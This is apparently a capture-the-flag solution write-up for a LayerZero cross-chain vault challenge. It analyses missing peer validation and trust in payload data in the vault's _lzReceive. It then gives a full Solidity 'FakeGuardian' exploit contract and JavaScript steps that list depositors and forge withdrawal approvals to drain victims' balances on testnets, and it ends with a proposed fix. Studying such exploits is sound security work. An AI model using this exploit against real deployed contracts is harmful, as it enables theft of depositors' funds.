# Challenge 2 Solution: The Quantum Thief 💎

**Challenge**: [The Quantum Thief](../challenges/challenge-02-quantum-thief.md)

---

## 1. Vulnerability Analysis

### The Critical Flaw: Missing Peer Validation + Payload Manipulation

The **RivalsOappContract** has **TWO critical vulnerabilities** in its `_lzReceive()` function:

1. **Missing Peer Validation**: Doesn't validate that withdrawal approvals come from the trusted guardian peer
2. **Payload Manipulation**: Uses user address and amount from the payload instead of validating against the stored request

**Vulnerable Code** (lines 199-226 in RivalOappContract.sol):

```solidity
} else if (messageType == MessageType.WITHDRAWAL_APPROVAL) {
    // 🚨 VULNERABILITY #1: No peer validation for approvals!
    // The developer mistakenly thought the OApp base contract would handle this,
    // but they need to explicitly validate for application-specific security logic.
    // Any contract on the guardian chain can send fake approvals!

    // Decode approval with user and amount from payload
    (, bytes32 requestId, address user, uint256 amount) = abi.decode(
        _payload,
        (MessageType, bytes32, address, uint256)
    );

    WithdrawalRequest storage request = pendingWithdrawals[requestId];
    require(!request.approved, "Already approved");
    require(request.user != address(0), "Invalid request");

    // 🚨 VULNERABILITY #2: Uses user and amount from payload, not from stored request! 🚨
    // Attacker can specify ANY user and ANY amount in their fake approval!
    require(balances[user] >= amount, "Insufficient balance");

    request.approved = true;
    balances[user] -= amount;
    token.transfer(user, amount);

    emit WithdrawalExecuted(user, amount);

    delete pendingWithdrawals[requestId];
}
```

### What's Missing?

The contract has **two fatal flaws**:

1. **No Peer Validation**: Never checks `_origin.sender` to verify the approval came from the legitimate guardian contract on Sepolia
2. **No Payload Validation**: Uses `user` and `amount` from the payload instead of comparing them against the stored `request.user` and `request.amount`

**Bonus Vulnerability**: The contract even provides helpful enumeration functions (`getAllDepositors()` and `getActiveDepositors()`) that make it trivial for attackers to identify all victims and their balances!

This means an attacker can:

1. Call `getActiveDepositors()` to get a list of all victims and their balances
2. Create a withdrawal request for themselves (to get a valid `requestId`)
3. Deploy their own "fake guardian" contract
4. Send a fake `WITHDRAWAL_APPROVAL` with **any victim's address and any amount**
5. Vault accepts the fake approval and drains the victim's funds!

The ping-pong pattern is **completely bypassed** because the contract trusts any approval message from any sender with any user/amount values.

---

## 2. Complete Exploit Contract Code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;

import {OApp, Origin, MessagingFee} from "@layerzerolabs/oapp-evm/contracts/oapp/OApp.sol";
import {OAppOptionsType3} from "@layerzerolabs/oapp-evm/contracts/oapp/libs/OAppOptionsType3.sol";
import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";

/// @title FakeGuardian
/// @notice Simple exploit contract that sends fake withdrawal approvals
/// @dev Bypasses the guardian verification by sending fake WITHDRAWAL_APPROVAL messages
contract FakeGuardian is OApp, OAppOptionsType3 {

    // Message type for enforced options
    uint16 public constant SEND = 1;

    // Message types (must match RivalsOappContract)
    enum MessageType {
        WITHDRAWAL_REQUEST,
        WITHDRAWAL_APPROVAL
    }

    constructor(
        address _endpoint,
        address _owner
    ) OApp(_endpoint, _owner) Ownable(_owner) {}

    /// @notice Send a fake approval to drain ANY user's funds from the vault
    /// @param targetVaultEid Endpoint ID of the vault chain (Base Sepolia)
    /// @param requestId The request ID to approve (from attacker's withdrawal request)
    /// @param victimAddress The address of the victim whose funds to steal
    /// @param amount The amount to drain from the victim
    /// @param options Execution options for the message
    function sendFakeApproval(
        uint32 targetVaultEid,
        bytes32 requestId,
        address victimAddress,
        uint256 amount,
        bytes calldata options
    ) external payable {
        // Create fake approval payload with arbitrary user and amount
        // This bypasses the guardian verification entirely!
        bytes memory payload = abi.encode(
            MessageType.WITHDRAWAL_APPROVAL,
            requestId,
            victimAddress,  // Can be ANY address with vault balance
            amount          // Can be ANY amount up to victim's balance
        );

        // Combine options
        bytes memory combinedOptions = combineOptions(targetVaultEid, SEND, options);

        // Send fake approval to vault
        _lzSend(
            targetVaultEid,
            payload,
            combinedOptions,
            MessagingFee(msg.value, 0),
            payable(msg.sender)
        );
    }

    /// @notice Quote fee for sending fake approval
    function quoteFakeApproval(
        uint32 targetVaultEid,
        bytes32 requestId,
        address victimAddress,
        uint256 amount,
        bytes calldata options
    ) external view returns (uint256) {
        bytes memory payload = abi.encode(
            MessageType.WITHDRAWAL_APPROVAL,
            requestId,
            victimAddress,
            amount
        );
        bytes memory combinedOptions = combineOptions(targetVaultEid, SEND, options);
        MessagingFee memory fee = _quote(targetVaultEid, payload, combinedOptions, false);
        return fee.nativeFee;
    }

    /// @notice Not needed for exploit, but required by OApp
    function _lzReceive(
        Origin calldata,
        bytes32,
        bytes calldata,
        address,
        bytes calldata
    ) internal override {
        // Do nothing - we only send messages, never receive
    }

    /// @notice Allow receiving ETH for gas payments
    receive() external payable {}

    /// @notice Withdraw ETH
    function withdraw() external onlyOwner {
        payable(msg.sender).transfer(address(this).balance);
    }
}
```

**That's it!** Only ~70 lines of code for the entire exploit.

---

## 3. Attack Flow Diagram

### Simple 5-Step Attack

```
Step 1: Setup
└─► Deploy FakeGuardian on Sepolia
    └─► Set vault on Base Sepolia as peer

Step 2: Enumerate Victims
└─► Call vault.getActiveDepositors() on Base Sepolia
    ├─► Returns arrays of all user addresses and their balances
    ├─► Pick a juicy target (highest balance, or all of them!)
    └─► Contract helpfully provides all the information needed!

Step 3: Create Legitimate Withdrawal Request (Just to Get a requestId)
└─► Call RivalsVault.requestWithdrawal() on Base Sepolia
    ├─► Deposit minimal tokens first (e.g., 1 token)
    ├─► Request withdrawal (saves requestId in contract)
    └─► Note: This creates a valid pending withdrawal
        └─► But we'll drain SOMEONE ELSE's funds, not our own!

Step 4: Send Fake Approval (THE EXPLOIT)
└─► Call FakeGuardian.sendFakeApproval() on Sepolia
    ├─► Use the same requestId from Step 3
    ├─► Specify VICTIM's address (from Step 2)
    ├─► Specify amount to drain (victim's full balance from Step 2)
    └─► Send fake WITHDRAWAL_APPROVAL message to Base Sepolia
        └─► Vault receives fake approval
            └─► Vault doesn't check peer OR validate user/amount!
                └─► ✅ Drains victim's funds to attacker immediately

Step 5: Profit
└─► Victim's tokens transferred to attacker
    └─► Repeat Steps 4-5 with different victims to drain entire vault
```

### Why It Works

```
Expected Flow (What should happen):
┌─────────────┐         ┌──────────────┐         ┌─────────────┐
│ Base Sepolia│  ping   │   Sepolia    │  pong   │ Base Sepolia│
│   (Vault)   │────────>│  (Guardian)  │────────>│   (Vault)   │
└─────────────┘         └──────────────┘         └─────────────┘
                        Trusted Peer ✓           Validates ✓

Actual Flow (What attacker does):
┌─────────────┐                                  ┌─────────────┐
│ Base Sepolia│         ┌──────────────┐         │ Base Sepolia│
│   (Vault)   │    X    │ Fake Guardian│────────>│   (Vault)   │
└─────────────┘         └──────────────┘         └─────────────┘
   Bypassed!            Attacker's Contract      No Validation! ✗
```

---

## 4. Step-by-Step Instructions

### Prerequisites

1. Deploy RivalsVault on Base Sepolia and Sepolia
2. Configure peers between them
3. Deposit some test tokens into Base Sepolia vault

### Execute the Attack

#### Step 1: Deploy FakeGuardian

```bash
# Deploy on Sepolia (same chain as real guardian)
npx hardhat run scripts/deploy-fake-guardian.ts --network sepolia
```

#### Step 2: Set Peer on FakeGuardian

```javascript
// Connect to Sepolia
const fakeGuardian = await ethers.getContractAt(
  "FakeGuardian",
  "0xYourFakeGuardianAddress"
);

// Set Base Sepolia vault as peer
const baseSepoliaEid = 40245;
const vaultAddressOnBase = "0xVaultAddressOnBaseSepolia";

await fakeGuardian.setPeer(
  baseSepoliaEid,
  ethers.utils.zeroPad(vaultAddressOnBase, 32)
);
```

#### Step 3: Create a Withdrawal Request

```javascript
// Connect to Base Sepolia vault
const vault = await ethers.getContractAt(
  "RivalsOappContract",
  vaultAddressOnBase
);

// Build options
const { Options } = require("@layerzerolabs/lz-v2-utilities");
const returnOptions = Options.newOptions()
  .addExecutorLzReceiveOption(100000, 0)
  .toHex();

const sepoliaEid = 40161;
const pongFee = await vault.quoteWithdrawal(
  100, // amount
  sepoliaEid,
  "0x",
  returnOptions
);

const sendOptions = Options.newOptions()
  .addExecutorLzReceiveOption(150000, pongFee.nativeFee)
  .toHex();

// Request withdrawal
const tx = await vault.requestWithdrawal(
  100, // amount to withdraw
  sepoliaEid, // guardian chain
  sendOptions,
  returnOptions,
  { value: totalFee }
);

const receipt = await tx.wait();

// Extract requestId from event
const event = receipt.events.find((e) => e.event === "WithdrawalRequested");
const requestId = event.args.requestId;
console.log("Request ID:", requestId);
```

#### Step 4: Send Fake Approval (Drain Victim's Funds!)

```javascript
// On Sepolia, use FakeGuardian to send fake approval

// Get all depositors and their balances (convenience function!)
const [users, amounts] = await vault.getActiveDepositors();
console.log("Active depositors:", users.length);

// specify a victim
const victimAddress = "0xVictimAddressWithVaultBalance";
const amountToDrain = await vault.balances(victimAddress);

const approvalOptions = Options.newOptions()
  .addExecutorLzReceiveOption(200000, 0)
  .toHex();

// Quote the fee
const fee = await fakeGuardian.quoteFakeApproval(
  baseSepoliaEid,
  requestId,
  victimAddress, // Victim's address
  amountToDrain, // Amount to steal from victim
  approvalOptions
);

// Send fake approval specifying victim and amount!
const attackTx = await fakeGuardian.sendFakeApproval(
  baseSepoliaEid,
  requestId,
  victimAddress, // Steal from this victim
  amountToDrain, // Steal this much
  approvalOptions,
  { value: fee }
);

await attackTx.wait();
console.log(
  "✅ Fake approval sent! Vault will drain victim's funds to attacker."
);
```

#### Step 5: Verify Success

```javascript
// Check victim's vault balance was drained
const victimBalanceAfter = await vault.balances(victimAddress);
console.log("Victim's vault balance after attack:", victimBalanceAfter); // Should be 0

// Check attacker received the victim's tokens
const attackerTokenBalance = await token.balanceOf(yourAddress);
console.log("Attacker's token balance:", attackerTokenBalance); // Should have victim's tokens

// The attack is complete - victim's funds were transferred to attacker!
console.log("✅ Successfully drained", amountToDrain, "tokens from victim!");
```

---

## 5. Evidence Template

### Deployment

- **FakeGuardian Address (Sepolia)**: `0x...`
- **Target Vault (Base Sepolia)**: `0x...`

### Attack Transactions

1. **Withdrawal Request**:

   - TX: `0x...`
   - Network: Base Sepolia
   - Request ID: `0x...`

2. **Fake Approval Sent**:

   - TX: `0x...`
   - Network: Sepolia
   - LayerZero Scan: [Link showing message delivery]

3. **Withdrawal Executed**:
   - TX: `0x...`
   - Network: Base Sepolia
   - Tokens transferred to attacker

### LayerZero Scan

The scan will show:

- Message sent from FakeGuardian (Sepolia) → RivalsVault (Base Sepolia)
- Message type: `WITHDRAWAL_APPROVAL`
- Status: ✅ Delivered and executed

---

## 6. Attack Summary

### Why This Attack Works

The vulnerability is **two-fold**: the vault has both **missing peer validation** and **payload manipulation**.

**Vulnerability 1: Missing Peer Validation**

In LayerZero OApps, the `_lzReceive()` function receives an `Origin` parameter that contains:

- `srcEid`: Source chain endpoint ID
- `sender`: Address of the contract that sent the message (THIS IS CRITICAL!)
- `nonce`: Message nonce

The vault **never checks** that `_origin.sender` matches the trusted guardian peer! This means any contract can send approval messages.

**Vulnerability 2: Payload Manipulation**

Even worse, the vault uses the `user` and `amount` values **directly from the payload** instead of validating them against the stored `WithdrawalRequest`:

```solidity
// Vulnerable code:
(, bytes32 requestId, address user, uint256 amount) = abi.decode(_payload, ...);

// Uses payload values directly - NO VALIDATION!
require(balances[user] >= amount, "Insufficient balance");
balances[user] -= amount;
token.transfer(user, amount);
```

It **should** be using `request.user` and `request.amount` instead!

### The Ping-Pong Pattern Failed Because

The ping-pong architecture was designed to ensure guardian approval, but **both security layers failed**:

1. **No peer check**: Accepts approvals from any contract, not just trusted guardian
2. **No payload validation**: Uses attacker-controlled user/amount values instead of stored request

This allows the attacker to:

1. Create a minimal withdrawal request (just to get a valid `requestId`)
2. Deploy their own "fake guardian" contract
3. Send fake approval with **any victim's address** and **any amount**
4. Vault drains the victim's funds and sends them to the attacker!

**Key Insight**: Having a sophisticated cross-chain architecture doesn't matter if you don't validate **both** message origins **and** payload contents!

---

## 7. Proposed Fix

### The Solution: Validate Message Sender AND Payload Data

The fix requires **TWO changes** to address both vulnerabilities:

```solidity
function _lzReceive(
    Origin calldata _origin,
    bytes32 /*_guid*/,
    bytes calldata _payload,
    address /*_executor*/,
    bytes calldata /*_extraData*/
) internal override {
    MessageType messageType = abi.decode(_payload, (MessageType));

    if (messageType == MessageType.WITHDRAWAL_REQUEST) {
        // ... existing code ...

    } else if (messageType == MessageType.WITHDRAWAL_APPROVAL) {
        // Decode approval (user and amount are still in payload, but we won't use them)
        (, bytes32 requestId, address user, uint256 amount) = abi.decode(
            _payload,
            (MessageType, bytes32, address, uint256)
        );

        WithdrawalRequest storage request = pendingWithdrawals[requestId];
        require(!request.approved, "Already approved");
        require(request.user != address(0), "Invalid request");

        // ✅ FIX 1: Verify approval came from trusted guardian peer
        require(
            _origin.sender == _getPeerOrRevert(_origin.srcEid),
            "Approval must come from guardian"
        );

        // ✅ FIX 2: Validate payload data matches stored request
        require(user == request.user, "User mismatch");
        require(amount == request.amount, "Amount mismatch");

        // Now use stored values, not payload values
        require(balances[request.user] >= request.amount, "Insufficient balance");

        request.approved = true;
        balances[request.user] -= request.amount;
        token.transfer(request.user, request.amount);

        emit WithdrawalExecuted(request.user, request.amount);
        delete pendingWithdrawals[requestId];
    }
}
```

### Why This Fix Works

**Fix 1: Peer Validation**

1. Use `_getPeerOrRevert(_origin.srcEid)` to get the trusted peer address for the source chain
2. Check that `_origin.sender` matches the expected guardian peer
3. Attacker's fake guardian won't match the trusted peer address registered via `setPeer()`

**Fix 2: Payload Validation**

1. Compare `user` from payload against `request.user` from storage
2. Compare `amount` from payload against `request.amount` from storage
3. Use stored values for the actual transfer, never trust payload values
4. Even if an attacker could send a fake approval, they can't change the withdrawal recipient or amount

### Important Note About OApp's Built-in Validation

While the OApp base contract's `lzReceive()` function validates peers automatically, the **vulnerability in this contract** is that the `WITHDRAWAL_APPROVAL` handler doesn't perform its **own** peer validation. The contract incorrectly handles both message types the same way, when it should only accept approval messages from a specific trusted guardian peer.

The fix explicitly validates `_origin.sender` for approval messages to ensure they come from the legitimate guardian contract, not just any registered peer.

---

## Key Takeaways

✅ **Always validate message origins** in cross-chain applications - check `_origin.sender` against trusted peers

✅ **Never trust payload data** - validate against stored state, don't use attacker-controlled values directly

✅ **Simple exploits are often the most effective** - this attack required minimal code but could drain the entire vault

✅ **LayerZero provides tools for validation** - use the `peers` mapping and `_origin.sender`

✅ **Payload manipulation attacks** are especially dangerous in cross-chain contexts where attackers can craft arbitrary messages

---

## Additional Resources

- [LayerZero OApp Security Best Practices](https://docs.layerzero.network/v2/developers/evm/oapp/overview#security)
- [Understanding Cross-Chain Message Validation](https://docs.layerzero.network/v2/developers/evm/protocol-gas-settings/options)
- [OApp Peer Configuration](https://docs.layerzero.network/v2/developers/evm/oapp/overview#peering)
